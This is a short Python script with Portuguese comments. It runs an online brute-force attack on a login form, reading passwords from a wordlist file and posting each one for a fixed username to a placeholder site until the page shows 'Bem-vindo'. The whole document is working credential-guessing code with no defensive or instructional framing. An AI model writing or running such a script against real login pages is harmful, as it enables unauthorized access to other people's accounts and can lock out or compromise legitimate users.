import requests

# Define as informações do site alvo
url = "https://exemplo.com/login"
username_field = "username"
password_field = "password"

# Lê a lista de senhas do arquivo txt
with open("wordlist.txt", "r") as f:
    passwords = f.read().splitlines()

# Faz uma requisição HTTP para cada senha da lista
for password in passwords:
    # Define as credenciais para a requisição
    data = {username_field: "seu_nome_de_usuario", password_field: password}

    # Faz a requisição HTTP
    response = requests.post(url, data=data)

    # Verifica se o login foi bem-sucedido
    if "Bem-vindo" in response.text:
        print(f"Login bem-sucedido com a senha {password}")
        break
    else:
        print(f"Senha incorreta: {password}")